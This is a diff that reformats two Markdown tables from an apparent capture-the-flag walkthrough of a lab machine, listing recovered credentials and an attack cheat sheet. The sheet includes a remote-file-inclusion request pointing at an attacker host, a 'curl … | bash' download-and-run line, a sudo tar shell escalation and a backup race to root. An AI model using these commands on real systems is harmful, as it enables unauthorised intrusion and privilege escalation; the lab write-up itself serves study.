@@ -854,10 +854,10 @@ Stage result: root shell (and confirmation of the root flag).
 
 ## Credentials
 
-| Source | Credential | Notes |
-| --- | --- | --- |
-| Monstra admin (`/webservices/monstra-3.0.4/admin/`) | `admin:admin` | RCE path is a dead end (HTTP 500) |
-| `/var/www/html/config.php` | `wpuser` / `w0rdpr3$$d@t@b@$3@cc3$$` (DB `wp`) | Not usable as `www-data` without the password on the mysql client |
+| Source                                              | Credential                                     | Notes                                                             |
+| --------------------------------------------------- | ---------------------------------------------- | ----------------------------------------------------------------- |
+| Monstra admin (`/webservices/monstra-3.0.4/admin/`) | `admin:admin`                                  | RCE path is a dead end (HTTP 500)                                 |
+| `/var/www/html/config.php`                          | `wpuser` / `w0rdpr3$$d@t@b@$3@cc3$$` (DB `wp`) | Not usable as `www-data` without the password on the mysql client |
 
 ---
 
@@ -878,13 +878,13 @@ Stage result: root shell (and confirmation of the root flag).
 
 ## Tools & cheat sheet
 
-| Tool | Purpose in this box | Key command |
-| --- | --- | --- |
-| `nmap` / `rustscan` | Port / service discovery | `nmap -sC -sV -oA ./nmap/quick.nmap 10.129.1.185` |
-| `gobuster` | Find `/webservices/wp/` | `gobuster dir -w …/directory-list-2.3-medium.txt -u 'http://10.129.1.185/webservices/'` |
-| `wpscan` | Aggressive plugin discovery (`gwolle-gb`) | `wpscan --enumerate all-plugins` (aggressive) |
-| `searchsploit` | Gwolle RFI advisory / PoC | `searchsploit gwolle` |
-| Gwolle RFI + `wp-load.php` | Unauth RCE as `www-data` | `curl '…/ajaxresponse.php?abspath=http://10.10.14.97/'` |
-| `sudo tar` (GTFOBins) | Escalate `www-data` → `onuma` | `sudo -u onuma tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash …` |
-| `linenum.sh` | Spot `backuperer.timer` | `curl http://10.10.14.97:80/linenum.sh \| bash` |
-| Archive-swap exploit | Race `backuperer` → root flag / SUID shell | swap `/var/tmp/.*` with symlink (or SUID) tarball during the 30s sleep |
+| Tool                       | Purpose in this box                        | Key command                                                                                    |
+| -------------------------- | ------------------------------------------ | ---------------------------------------------------------------------------------------------- |
+| `nmap` / `rustscan`        | Port / service discovery                   | `nmap -sC -sV -oA ./nmap/quick.nmap 10.129.1.185`                                              |
+| `gobuster`                 | Find `/webservices/wp/`                    | `gobuster dir -w …/directory-list-2.3-medium.txt -u 'http://10.129.1.185/webservices/'`        |
+| `wpscan`                   | Aggressive plugin discovery (`gwolle-gb`)  | `wpscan --enumerate all-plugins` (aggressive)                                                  |
+| `searchsploit`             | Gwolle RFI advisory / PoC                  | `searchsploit gwolle`                                                                          |
+| Gwolle RFI + `wp-load.php` | Unauth RCE as `www-data`                   | `curl '…/ajaxresponse.php?abspath=http://10.10.14.97/'`                                        |
+| `sudo tar` (GTFOBins)      | Escalate `www-data` → `onuma`              | `sudo -u onuma tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash …` |
+| `linenum.sh`               | Spot `backuperer.timer`                    | `curl http://10.10.14.97:80/linenum.sh \| bash`                                                |
+| Archive-swap exploit       | Race `backuperer` → root flag / SUID shell | swap `/var/tmp/.*` with symlink (or SUID) tarball during the 30s sleep                         |
